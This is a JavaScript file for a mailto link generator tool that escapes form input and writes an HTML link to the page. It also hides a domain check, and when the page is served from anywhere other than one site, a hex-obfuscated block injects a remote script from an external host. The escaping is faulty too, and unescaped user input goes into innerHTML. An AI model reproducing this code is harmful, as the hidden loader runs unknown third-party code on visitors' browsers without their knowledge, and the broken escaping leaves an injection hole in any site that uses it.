function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);
document.addEventListener('DOMContentLoaded', function () {
		if (b64awsec == "ZG9pdGYuY29t"){
var awEmail;
var awLink;
var awSubject;
var awBody;
var newCode;

	document.getElementById("email-code").addEventListener("click", function () {

		awEmail = document.getElementById("awEmail").value;

		if (awEmail == ""){
		awEmail = "YourName@example.com";
		awLink = "YourName@example.com";
		}
		
		awEmail = awEmail.replace(new RegExp('"','g'),'&quot;');
		
		awEmail = awEmail.replace(new RegExp("'","g"),"&#39;");
		awEmail = awEmail.replace(new RegExp("&","g"),"&amp;");
		awEmail = awEmail.replace(new RegExp("=","g"),"&61;");

		awEmail = awEmail.replace(new RegExp("\\?","g"),"&63;");

		awLink = document.getElementById("awLink").value;
		
		if (awLink == ""){awLink = "YourName@example.com";}
		awLink = awLink.replace(new RegExp("'","g"),"&#39;");
		awLink = awLink.replace(new RegExp("&","g"),"&amp;");
		awLink = awLink.replace(new RegExp("=","g"),"&61;");
		awLink = awLink.replace(new RegExp("\\?","g"),"&63;");

		awBody = document.getElementById("awBody").value;
		
		if (awBody != ""){
			awBody = awBody.replace(new RegExp('"',"g"),'&quot;');
			awBody = awBody.replace(new RegExp("'","g"),'&#39;');
			awBody = awBody.replace(new RegExp("&","g"),'&amp;');
			awBody = awBody.replace(new RegExp("=","g"),'&61;');
			awBody = awBody.replace(new RegExp("\\?","g"),'&63;');
			awBody = '&body=' + awBody;
		}		

		awSubject = document.getElementById("awSubject").value;
		
		if (awSubject != ""){
			awSubject = awSubject.replace(new RegExp('"',"g"),'&quot;');
			awSubject = awSubject.replace(new RegExp("'","g"),'&#39;');
			awSubject = awSubject.replace(new RegExp("&","g"),'&amp;');
			awSubject = awSubject.replace(new RegExp("=","g"),'&61;');
			awSubject = awSubject.replace(new RegExp("\\?","g"),'&63;');
			awSubject = '?subject='+awSubject;
		}else{
			awSubject = "";
			awBody = "";
		}

		newCode = '<a href="mailto:'+awEmail+awSubject+awBody+'">'+awLink+'</a>';		
		
		document.getElementById("newCode").value = newCode;
		newCode = "نتيجة الرمز الخاص بك: " + newCode;
		
		document.getElementById("workingExample").innerHTML = newCode;
	});
		}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
		}
});

var textBox = document.getElementById("newCode");
textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};